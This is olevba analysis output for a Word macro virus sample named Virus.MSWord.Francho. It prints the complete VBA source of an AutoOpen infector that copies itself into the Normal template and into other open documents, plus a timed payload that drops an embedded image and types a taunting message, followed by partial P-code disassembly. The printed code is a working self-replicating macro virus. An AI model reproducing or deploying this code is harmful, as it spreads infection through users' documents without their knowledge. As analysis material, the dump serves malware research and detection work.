olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Francho
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Francho - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Francho - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
' Infector Engine
' (c) 1999 by ?
On Error GoTo error
 

anfitrion = Application.MacroContainer
portador = Application.Documents(1).path + "\" + Application.Documents(1)
globaldot = Application.Templates(1).path + "\" + Application.Templates(1)


If anfitrion = Application.Templates(1) Then GoTo SeEjecutoElGlobal
 

Application.OrganizerDelete Source:=globaldot, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
    

error:
If portador = "" Then GoTo fin
Application.OrganizerCopy Source:=portador, Destination:=globaldot, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems


GoTo fin

SeEjecutoElGlobal:


On Error GoTo fin
For T = 1 To 10
    anfitrion = Application.Documents(T).path + "\" + Application.Documents(T)
    Application.OrganizerCopy Source:=globaldot, Destination:=anfitrion, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
Next T
fin:


cs = Second(Now())
If (cs > 50) Then
globaldotf = Application.Templates(1).path + "\francho.jpg"
GenBin0 (globaldotf)
    ActiveDocument.Shapes.AddPicture Anchor:=Selection.Range, FileName:= _
        globaldotf, LinkToFile:=False, _
        SaveWithDocument:=True
    Selection.TypeText Text:="Hasta donde crees que puedes llegar hoy ?"
End If

End Sub
Sub GenBin0(spath As String)

Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile(spath, True)

Line = Chr$(255) + Chr$(216) + Chr$(255) + Chr$(224) + Chr$(0) + Chr$(16) + Chr$(74) + Chr$(70) + Chr$(73) + Chr$(70) + Chr$(0) + Chr$(1) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(0) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(255) + Chr$(219) + Chr$(0) + Chr$(67) + Chr$(0) + Chr$(28) + Chr$(19) + Chr$(21) + Chr$(24) + Chr$(21)
a.Write (Line)
Line = Chr$(17) + Chr$(28) + Chr$(24) + Chr$(22) + Chr$(24) + Chr$(31) + Chr$(29) + Chr$(28) + Chr$(33) + Chr$(41) + Chr$(69) + Chr$(45) + Chr$(41) + Chr$(38) + Chr$(38) + Chr$(41) + Chr$(84) + Chr$(60) + Chr$(64) + Chr$(50) + Chr$(69) + Chr$(100) + Chr$(88) + Chr$(105) + Chr$(103) + Chr$(98) + Chr$(88) + Chr$(96) + Chr$(95) + Chr$(110)
a.Write (Line)
Line = Chr$(124) + Chr$(158) + Chr$(134) + Chr$(110) + Chr$(117) + Chr$(150) + Chr$(119) + Chr$(95) + Chr$(96) + Chr$(138) + Chr$(187) + Chr$(139) + Chr$(150) + Chr$(163) + Chr$(169) + Chr$(177) + Chr$(179) + Chr$(177) + Chr$(107) + Chr$(132) + Chr$(194) + Chr$(208) + Chr$(193) + Chr$(172) + Chr$(206) + Chr$(158) + Chr$(174) + Chr$(177) + Chr$(170) + Chr$(255)
a.Write (Line)
Line = Chr$(219) + Chr$(0) + Chr$(67) + Chr$(1) + Chr$(29) + Chr$(31) + Chr$(31) + Chr$(41) + Chr$(36) + Chr$(41) + Chr$(81) + Chr$(45) + Chr$(45) + Chr$(81) + Chr$(170) + Chr$(114) + Chr$(96) + Chr$(114) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170)
a.Write (Line)
Line = Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170)
a.Write (Line)
Line = Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(255) + Chr$(192) + Chr$(0) + Chr$(17) + Chr$(8) + Chr$(0) + Chr$(81) + Chr$(0) + Chr$(68) + Chr$(3) + Chr$(1) + Chr$(34) + Chr$(0) + Chr$(2) + Chr$(17) + Chr$(1) + Chr$(3) + Chr$(17) + Chr$(1) + Chr$(255) + Chr$(196) + Chr$(0)
a.Write (Line)
Line = Chr$(31) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(5) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(2) + Chr$(3) + Chr$(4) + Chr$(5) + Chr$(6) + Chr$(7) + Chr$(8) + Chr$(9) + Chr$(10) + Chr$(11)
a.Write (Line)
Line = Chr$(255) + Chr$(196) + Chr$(0) + Chr$(181) + Chr$(16) + Chr$(0) + Chr$(2) + Chr$(1) + Chr$(3) + Chr$(3) + Chr$(2) + Chr$(4) + Chr$(3) + Chr$(5) + Chr$(5) + Chr$(4) + Chr$(4) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(125) + Chr$(1) + Chr$(2) + Chr$(3) + Chr$(0) + Chr$(4) + Chr$(17) + Chr$(5) + Chr$(18) + Chr$(33)
a.Write (Line)
Line = Chr$(49) + Chr$(65) + Chr$(6) + Chr$(19) + Chr$(81) + Chr$(97) + Chr$(7) + Chr$(34) + Chr$(113) + Chr$(20) + Chr$(50) + Chr$(129) + Chr$(145) + Chr$(161) + Chr$(8) + Chr$(35) + Chr$(66) + Chr$(177) + Chr$(193) + Chr$(21) + Chr$(82) + Chr$(209) + Chr$(240) + Chr$(36) + Chr$(51) + Chr$(98) + Chr$(114) + Chr$(130) + Chr$(9) + Chr$(10)
a.Write (Line)
Line = Chr$(22) + Chr$(23) + Chr$(24) + Chr$(25) + Chr$(26) + Chr$(37) + Chr$(38) + Chr$(39) + Chr$(40) + Chr$(41) + Chr$(42) + Chr$(52) + Chr$(53) + Chr$(54) + Chr$(55) + Chr$(56) + Chr$(57) + Chr$(58) + Chr$(67) + Chr$(68) + Chr$(69) + Chr$(70) + Chr$(71) + Chr$(72) + Chr$(73) + Chr$(74) + Chr$(83) + Chr$(84) + Chr$(85) + Chr$(86)
a.Write (Line)
Line = Chr$(87) + Chr$(88) + Chr$(89) + Chr$(90) + Chr$(99) + Chr$(100) + Chr$(101) + Chr$(102) + Chr$(103) + Chr$(104) + Chr$(105) + Chr$(106) + Chr$(115) + Chr$(116) + Chr$(117) + Chr$(118) + Chr$(119) + Chr$(120) + Chr$(121) + Chr$(122) + Chr$(131) + Chr$(132) + Chr$(133) + Chr$(134) + Chr$(135) + Chr$(136) + Chr$(137) + Chr$(138) + Chr$(146) + Chr$(147)
a.Write (Line)
Line = Chr$(148) + Chr$(149) + Chr$(150) + Chr$(151) + Chr$(152) + Chr$(153) + Chr$(154) + Chr$(162) + Chr$(163) + Chr$(164) + Chr$(165) + Chr$(166) + Chr$(167) + Chr$(168) + Chr$(169) + Chr$(170) + Chr$(178) + Chr$(179) + Chr$(180) + Chr$(181) + Chr$(182) + Chr$(183) + Chr$(184) + Chr$(185) + Chr$(186) + Chr$(194) + Chr$(195) + Chr$(196) + Chr$(197) + Chr$(198)
a.Write (Line)
Line = Chr$(199) + Chr$(200) + Chr$(201) + Chr$(202) + Chr$(210) + Chr$(211) + Chr$(212) + Chr$(213) + Chr$(214) + Chr$(215) + Chr$(216) + Chr$(217) + Chr$(218) + Chr$(225) + Chr$(226) + Chr$(227) + Chr$(228) + Chr$(229) + Chr$(230) + Chr$(231) + Chr$(232) + Chr$(233) + Chr$(234) + Chr$(241) + Chr$(242) + Chr$(243) + Chr$(244) + Chr$(245) + Chr$(246) + Chr$(247)
a.Write (Line)
Line = Chr$(248) + Chr$(249) + Chr$(250) + Chr$(255) + Chr$(196) + Chr$(0) + Chr$(31) + Chr$(1) + Chr$(0) + Chr$(3) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(2) + Chr$(3) + Chr$(4) + Chr$(5)
a.Write (Line)
Line = Chr$(6) + Chr$(7) + Chr$(8) + Chr$(9) + Chr$(10) + Chr$(11) + Chr$(255) + Chr$(196) + Chr$(0) + Chr$(181) + Chr$(17) + Chr$(0) + Chr$(2) + Chr$(1) + Chr$(2) + Chr$(4) + Chr$(4) + Chr$(3) + Chr$(4) + Chr$(7) + Chr$(5) + Chr$(4) + Chr$(4) + Chr$(0) + Chr$(1) + Chr$(2) + Chr$(119) + Chr$(0) + Chr$(1) + Chr$(2)
a.Write (Line)
Line = Chr$(3) + Chr$(17) + Chr$(4) + Chr$(5) + Chr$(33) + Chr$(49) + Chr$(6) + Chr$(18) + Chr$(65) + Chr$(81) + Chr$(7) + Chr$(97) + Chr$(113) + Chr$(19) + Chr$(34) + Chr$(50) + Chr$(129) + Chr$(8) + Chr$(20) + Chr$(66) + Chr$(145) + Chr$(161) + Chr$(177) + Chr$(193) + Chr$(9) + Chr$(35) + Chr$(51) + Chr$(82) + Chr$(240) + Chr$(21)
a.Write (Line)
Line = Chr$(98) + Chr$(114) + Chr$(209) + Chr$(10) + Chr$(22) + Chr$(36) + Chr$(52) + Chr$(225) + Chr$(37) + Chr$(241) + Chr$(23) + Chr$(24) + Chr$(25) + Chr$(26) + Chr$(38) + Chr$(39) + Chr$(40) + Chr$(41) + Chr$(42) + Chr$(53) + Chr$(54) + Chr$(55) + Chr$(56) + Chr$(57) + Chr$(58) + Chr$(67) + Chr$(68) + Chr$(69) + Chr$(70) + Chr$(71)
a.Write (Line)
Line = Chr$(72) + Chr$(73) + Chr$(74) + Chr$(83) + Chr$(84) + Chr$(85) + Chr$(86) + Chr$(87) + Chr$(88) + Chr$(89) + Chr$(90) + Chr$(99) + Chr$(100) + Chr$(101) + Chr$(102) + Chr$(103) + Chr$(104) + Chr$(105) + Chr$(106) + Chr$(115) + Chr$(116) + Chr$(117) + Chr$(118) + Chr$(119) + Chr$(120) + Chr$(121) + Chr$(122) + Chr$(130) + Chr$(131) + Chr$(132)
a.Write (Line)
Line = Chr$(133) + Chr$(134) + Chr$(135) + Chr$(136) + Chr$(137) + Chr$(138) + Chr$(146) + Chr$(147) + Chr$(148) + Chr$(149) + Chr$(150) + Chr$(151) + Chr$(152) + Chr$(153) + Chr$(154) + Chr$(162) + Chr$(163) + Chr$(164) + Chr$(165) + Chr$(166) + Chr$(167) + Chr$(168) + Chr$(169) + Chr$(170) + Chr$(178) + Chr$(179) + Chr$(180) + Chr$(181) + Chr$(182) + Chr$(183)
a.Write (Line)
Line = Chr$(184) + Chr$(185) + Chr$(186) + Chr$(194) + Chr$(195) + Chr$(196) + Chr$(197) + Chr$(198) + Chr$(199) + Chr$(200) + Chr$(201) + Chr$(202) + Chr$(210) + Chr$(211) + Chr$(212) + Chr$(213) + Chr$(214) + Chr$(215) + Chr$(216) + Chr$(217) + Chr$(218) + Chr$(226) + Chr$(227) + Chr$(228) + Chr$(229) + Chr$(230) + Chr$(231) + Chr$(232) + Chr$(233) + Chr$(234)
a.Write (Line)
Line = Chr$(242) + Chr$(243) + Chr$(244) + Chr$(245) + Chr$(246) + Chr$(247) + Chr$(248) + Chr$(249) + Chr$(250) + Chr$(255) + Chr$(218) + Chr$(0) + Chr$(12) + Chr$(3) + Chr$(1) + Chr$(0) + Chr$(2) + Chr$(17) + Chr$(3) + Chr$(17) + Chr$(0) + Chr$(63) + Chr$(0) + Chr$(232) + Chr$(113) + Chr$(65) + Chr$(28) + Chr$(82) + Chr$(230) + Chr$(162)
a.Write (Line)
Line = Chr$(184) + Chr$(157) + Chr$(32) + Chr$(136) + Chr$(200) + Chr$(231) + Chr$(129) + Chr$(76) + Chr$(130) + Chr$(25) + Chr$(184) + Chr$(57) + Chr$(172) + Chr$(233) + Chr$(117) + Chr$(27) + Chr$(100) + Chr$(109) + Chr$(165) + Chr$(201) + Chr$(35) + Chr$(208) + Chr$(86) + Chr$(125) + Chr$(253) + Chr$(252) + Chr$(183) + Chr$(14) + Chr$(73) + Chr$(98)
a.Write (Line)
Line = Chr$(171) + Chr$(217) + Chr$(69) + Chr$(103) + Chr$(51) + Chr$(18) + Chr$(106) + Chr$(174) + Chr$(79) + Chr$(179) + Chr$(79) + Chr$(115) + Chr$(160) + Chr$(143) + Chr$(84) + Chr$(181) + Chr$(25) + Chr$(249) + Chr$(207) + Chr$(229) + Chr$(78) + Chr$(109) + Chr$(74) + Chr$(218) + Chr$(81) + Chr$(128) + Chr$(248) + Chr$(62) + Chr$(245) + Chr$(206)
a.Write (Line)
Line = Chr$(112) + Chr$(59) + Chr$(210) + Chr$(110) + Chr$(57) + Chr$(200) + Chr$(163) + Chr$(155) + Chr$(81) + Chr$(251) + Chr$(40) + Chr$(218) + Chr$(198) + Chr$(228) + Chr$(196) + Chr$(48) + Chr$(36) + Chr$(28) + Chr$(143) + Chr$(106) + Chr$(85) + Chr$(21) + Chr$(153) + Chr$(109) + Chr$(114) + Chr$(64) + Chr$(242) + Chr$(220) + Chr$(228) + Chr$(30)
a.Write (Line)
Line = Chr$(134) + Chr$(181) + Chr$(19) + Chr$(165) + Chr$(111) + Chr$(25) + Chr$(93) + Chr$(28) + Chr$(243) + Chr$(143) + Chr$(40) + Chr$(245) + Chr$(28) + Chr$(82) + Chr$(226) + Chr$(149) + Chr$(122) + Chr$(82) + Chr$(226) + Chr$(131) + Chr$(51) + Chr$(102) + Chr$(176) + Chr$(245) + Chr$(139) + Chr$(146) + Chr$(242) + Chr$(249) + Chr$(43) + Chr$(247)
a.Write (Line)
Line = Chr$(84) + Chr$(243) + Chr$(245) + Chr$(173) + Chr$(182) + Chr$(56) + Chr$(21) + Chr$(206) + Chr$(198) + Chr$(4) + Chr$(186) + Chr$(137) + Chr$(18) + Chr$(12) + Chr$(134) + Chr$(99) + Chr$(92) + Chr$(199) + Chr$(114) + Chr$(51) + Chr$(102) + Chr$(193) + Chr$(53) + Chr$(36) + Chr$(54) + Chr$(134) + Chr$(76) + Chr$(28) + Chr$(30) + Chr$(120)
a.Write (Line)
Line = Chr$(197) + Chr$(106) + Chr$(205) + Chr$(5) + Chr$(132) + Chr$(50) + Chr$(252) + Chr$(197) + Chr$(119) + Chr$(122) + Chr$(19) + Chr$(154) + Chr$(177) + Chr$(26) + Chr$(164) + Chr$(139) + Chr$(152) + Chr$(216) + Chr$(17) + Chr$(237) + Chr$(69) + Chr$(203) + Chr$(49) + Chr$(155) + Chr$(74) + Chr$(112) + Chr$(126) + Chr$(86) + Chr$(4) + Chr$(122)
a.Write (Line)
Line = Chr$(82) + Chr$(29) + Chr$(56) + Chr$(170) + Chr$(243) + Chr$(214) + Chr$(182) + Chr$(101) + Chr$(217) + Chr$(31) + Chr$(46) + Chr$(192) + Chr$(125) + Chr$(106) + Chr$(7) + Chr$(146) + Chr$(54) + Chr$(7) + Chr$(107) + Chr$(131) + Chr$(244) + Chr$(169) + Chr$(3) + Chr$(2) + Chr$(68) + Chr$(49) + Chr$(190) + Chr$(13) + Chr$(107) + Chr$(89)
a.Write (Line)
Line = Chr$(204) + Chr$(37) + Chr$(132) + Chr$(28) + Chr$(242) + Chr$(56) + Chr$(53) + Chr$(66) + Chr$(255) + Chr$(0) + Chr$(30) + Chr$(96) + Chr$(20) + Chr$(237) + Chr$(60) + Chr$(225) + Chr$(219) + Chr$(240) + Chr$(173) + Chr$(105) + Chr$(189) + Chr$(76) + Chr$(170) + Chr$(198) + Chr$(241) + Chr$(54) + Chr$(87) + Chr$(165) + Chr$(46) + Chr$(41)
a.Write (Line)
Line = Chr$(169) + Chr$(157) + Chr$(162) + Chr$(157) + Chr$(91) + Chr$(28) + Chr$(102) + Chr$(149) + Chr$(196) + Chr$(241) + Chr$(194) + Chr$(160) + Chr$(200) + Chr$(112) + Chr$(13) + Chr$(97) + Chr$(196) + Chr$(124) + Chr$(203) + Chr$(213) + Chr$(217) + Chr$(221) + Chr$(243) + Chr$(91) + Chr$(151) + Chr$(17) + Chr$(44) + Chr$(209) + Chr$(149) + Chr$(113)
a.Write (Line)
Line = Chr$(145) + Chr$(89) + Chr$(246) + Chr$(182) + Chr$(194) + Chr$(27) + Chr$(197) + Chr$(36) + Chr$(231) + Chr$(57) + Chr$(197) + Chr$(115) + Chr$(116) + Chr$(59) + Chr$(162) + Chr$(67) + Chr$(116) + Chr$(138) + Chr$(132) + Chr$(237) + Chr$(135) + Chr$(118) + Chr$(79) + Chr$(60) + Chr$(115) + Chr$(75) + Chr$(108) + Chr$(118) + Chr$(51) + Chr$(42)
a.Write (Line)
Line = Chr$(174) + Chr$(0) + Chr$(29) + Chr$(170) + Chr$(244) + Chr$(136) + Chr$(11) + Chr$(84) + Chr$(126) + Chr$(88) + Chr$(17) + Chr$(177) + Chr$(29) + Chr$(77) + Chr$(73) + Chr$(101) + Chr$(11) + Chr$(146) + Chr$(39) + Chr$(109) + Chr$(172) + Chr$(58) + Chr$(122) + Chr$(213) + Chr$(117) + Chr$(142) + Chr$(23) + Chr$(192) + Chr$(17) + Chr$(24)
a.Write (Line)
Line = Chr$(207) + Chr$(99) + Chr$(87) + Chr$(99) + Chr$(64) + Chr$(100) + Chr$(108) + Chr$(243) + Chr$(220) + Chr$(84) + Chr$(143) + Chr$(24) + Chr$(219) + Chr$(158) + Chr$(244) + Chr$(1) + Chr$(207) + Chr$(94) + Chr$(18) + Chr$(178) + Chr$(237) + Chr$(99) + Chr$(200) + Chr$(167) + Chr$(216) + Chr$(182) + Chr$(217) + Chr$(48) + Chr$(123) + Chr$(211)
a.Write (Line)
Line = Chr$(181) + Chr$(52) + Chr$(45) + Chr$(50) + Chr$(129) + Chr$(215) + Chr$(20) + Chr$(182) + Chr$(118) + Chr$(178) + Chr$(151) + Chr$(12) + Chr$(202) + Chr$(66) + Chr$(138) + Chr$(210) + Chr$(61) + Chr$(8) + Chr$(150) + Chr$(204) + Chr$(217) + Chr$(143) + Chr$(148) + Chr$(20) + Chr$(234) + Chr$(72) + Chr$(198) + Chr$(16) + Chr$(10) + Chr$(117)
a.Write (Line)
Line = Chr$(108) + Chr$(112) + Chr$(154) + Chr$(141) + Chr$(200) + Chr$(170) + Chr$(211) + Chr$(97) + Chr$(66) + Chr$(184) + Chr$(31) + Chr$(50) + Chr$(176) + Chr$(205) + Chr$(76) + Chr$(138) + Chr$(255) + Chr$(0) + Chr$(196) + Chr$(216) + Chr$(162) + Chr$(84) + Chr$(202) + Chr$(48) + Chr$(29) + Chr$(72) + Chr$(172) + Chr$(14) + Chr$(180) + Chr$(250)
a.Write (Line)
Line = Chr$(153) + Chr$(154) + Chr$(141) + Chr$(232) + Chr$(128) + Chr$(129) + Chr$(25) + Chr$(4) + Chr$(154) + Chr$(164) + Chr$(186) + Chr$(195) + Chr$(253) + Chr$(214) + Chr$(65) + Chr$(182) + Chr$(160) + Chr$(184) + Chr$(33) + Chr$(103) + Chr$(196) + Chr$(128) + Chr$(250) + Chr$(16) + Chr$(123) + Chr$(81) + Chr$(230) + Chr$(42) + Chr$(227) + Chr$(16)
a.Write (Line)
Line = Chr$(43) + Chr$(122) + Chr$(19) + Chr$(82) + Chr$(108) + Chr$(60) + Chr$(106) + Chr$(108) + Chr$(28) + Chr$(157) + Chr$(188) + Chr$(14) + Chr$(149) + Chr$(114) + Chr$(43) + Chr$(196) + Chr$(157) + Chr$(24) + Chr$(142) + Chr$(8) + Chr$(25) + Chr$(35) + Chr$(210) + Chr$(179) + Chr$(220) + Chr$(163) + Chr$(227) + Chr$(48) + Chr$(4) + Chr$(7)
a.Write (Line)
Line = Chr$(169) + Chr$(6) + Chr$(171) + Chr$(9) + Chr$(0) + Chr$(47) + Chr$(179) + Chr$(32) + Chr$(26) + Chr$(44) + Chr$(6) + Chr$(141) + Chr$(188) + Chr$(176) + Chr$(188) + Chr$(242) + Chr$(153) + Chr$(8) + Chr$(221) + Chr$(198) + Chr$(208) + Chr$(69) + Chr$(91) + Chr$(201) + Chr$(99) + Chr$(146) + Chr$(115) + Chr$(89) + Chr$(154) + Chr$(124)
a.Write (Line)
Line = Chr$(123) + Chr$(153) + Chr$(156) + Chr$(253) + Chr$(5) + Chr$(106) + Chr$(37) + Chr$(107) + Chr$(8) + Chr$(219) + Chr$(83) + Chr$(154) + Chr$(172) + Chr$(254) + Chr$(202) + Chr$(30) + Chr$(58) + Chr$(81) + Chr$(64) + Chr$(233) + Chr$(75) + Chr$(86) + Chr$(115) + Chr$(154) + Chr$(99) + Chr$(154) + Chr$(70) + Chr$(28) + Chr$(80) + Chr$(51)
a.Write (Line)
Line = Chr$(138) + Chr$(43) + Chr$(3) + Chr$(172) + Chr$(195) + Chr$(214) + Chr$(172) + Chr$(216) + Chr$(176) + Chr$(154) + Chr$(49) + Chr$(159) + Chr$(239) + Chr$(10) + Chr$(204) + Chr$(142) + Chr$(232) + Chr$(198) + Chr$(152) + Chr$(32) + Chr$(87) + Chr$(81) + Chr$(54) + Chr$(15) + Chr$(28) + Chr$(19) + Chr$(212) + Chr$(138) + Chr$(161) + Chr$(45)
a.Write (Line)
Line = Chr$(165) + Chr$(179) + Chr$(72) + Chr$(75) + Chr$(66) + Chr$(191) + Chr$(149) + Chr$(23) + Chr$(52) + Chr$(142) + Chr$(198) + Chr$(44) + Chr$(215) + Chr$(38) + Chr$(101) + Chr$(8) + Chr$(51) + Chr$(244) + Chr$(167) + Chr$(90) + Chr$(90) + Chr$(59) + Chr$(157) + Chr$(242) + Chr$(12) + Chr$(39) + Chr$(167) + Chr$(173) + Chr$(106) + Chr$(27)
a.Write (Line)
Line = Chr$(104) + Chr$(84) + Chr$(254) + Chr$(238) + Chr$(53) + Chr$(95) + Chr$(160) + Chr$(169) + Chr$(93) + Chr$(54) + Chr$(167) + Chr$(225) + Chr$(74) + Chr$(229) + Chr$(21) + Chr$(227) + Chr$(10) + Chr$(167) + Chr$(0) + Chr$(98) + Chr$(167) + Chr$(74) + Chr$(129) + Chr$(136) + Chr$(92) + Chr$(28) + Chr$(231) + Chr$(176) + Chr$(52) + Chr$(228)
a.Write (Line)
Line = Chr$(156) + Chr$(96) + Chr$(250) + Chr$(142) + Chr$(181) + Chr$(212) + Chr$(162) + Chr$(218) + Chr$(56) + Chr$(166) + Chr$(181) + Chr$(101) + Chr$(160) + Chr$(56) + Chr$(163) + Chr$(20) + Chr$(200) + Chr$(228) + Chr$(87) + Chr$(64) + Chr$(202) + Chr$(120) + Chr$(52) + Chr$(237) + Chr$(222) + Chr$(226) + Chr$(166) + Chr$(204) + Chr$(131) + Chr$(79)
a.Write (Line)
Line = Chr$(181) + Chr$(33) + Chr$(233) + Chr$(75) + Chr$(218) + Chr$(144) + Chr$(244) + Chr$(172) + Chr$(14) + Chr$(162) + Chr$(171) + Chr$(127) + Chr$(199) + Chr$(219) + Chr$(255) + Chr$(0) + Chr$(184) + Chr$(63) + Chr$(153) + Chr$(168) + Chr$(102) + Chr$(169) + Chr$(155) + Chr$(254) + Chr$(62) + Chr$(223) + Chr$(253) + Chr$(193) + Chr$(252) + Chr$(205)
a.Write (Line)
Line = Chr$(67) + Chr$(53) + Chr$(18) + Chr$(46) + Chr$(59) + Chr$(8) + Chr$(191) + Chr$(195) + Chr$(68) + Chr$(223) + Chr$(112) + Chr$(80) + Chr$(191) + Chr$(195) + Chr$(68) + Chr$(223) + Chr$(112) + Chr$(84) + Chr$(150) + Chr$(82) + Chr$(254) + Chr$(35) + Chr$(254) + Chr$(253) + Chr$(74) + Chr$(223) + Chr$(125) + Chr$(190) + Chr$(149) + Chr$(23)
a.Write (Line)
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Francho
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/NewMacros - 25342 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0010 " Infector Engine"
' Line #2:
' 	QuoteRem 0x0000 0x000E " (c) 1999 by ?"
' Line #3:
' 	OnError Error 
' Line #4:
' Line #5:
' Line #6:
' 	Ld Application 
' 	MemLd MacroContainer 
' 	St anfitrion 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	Add 
' 	St portador 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Templates 0x0001 
' 	Add 
' 	St globaldot 
' Line #9:
' Line #10:
' Line #11:
' 	Ld anfitrion 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Templates 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo SeEjecutoElGlobal 
' 	EndIf 
' Line #12:
' Line #13:
' Line #14:
' 	Ld globaldot 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #15:
' Line #16:
' Line #17:
' 	Label Error 
' Line #18:
' 	Ld portador 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fin 
' 	EndIf 
' Line #19:
' 	Ld portador 
' 	ParamNamed Source 
' 	Ld globaldot 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' Line #21:
' Line #22:
' 	GoTo fin 
' Line #23:
' Line #24:
' 	Label SeEjecutoElGlobal 
' Line #25:
' Line #26:
' Line #27:
' 	OnError fin 
' Line #28:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #29:
' 	Ld T 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld T 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	Add 
' 	St anfitrion 
' Line #30:
' 	Ld globaldot 
' 	ParamNamed Source 
' 	Ld anfitrion 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Label fin 
' Line #33:
' Line #34:
' Line #35:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	St cs 
' Line #36:
' 	Ld cs 
' 	LitDI2 0x0032 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd path 
' 	LitStr 0x000C "\francho.jpg"
' 	Add 
' 	St globaldotf 
' Line #38:
' 	Ld globaldotf 
' 	Paren 
' 	ArgsCall GenBin0 0x0001 
' Line #39:
' 	LineCont 0x0008 0D 00 08 00 13 00 08 00
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Anchor 
' 	Ld globaldotf 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToFile 
' 	LitVarSpecial (True)
' 	ParamNamed SaveWithDocument 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemCall AddPicture 0x0004 
' Line #40:
' 	LitStr 0x0029 "Hasta donde crees que puedes llegar hoy ?"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub GenBin0(spath As String))
' Line #45:
' Line #46:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #47:
' 	SetStmt 
' 	Ld spath 
' 	LitVarSpecial (True)
' 	Ld fs 
' 	ArgsMemLd CreateTextFile 0x0002 
' 	Set a 
' Line #48:
' Line #49:
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
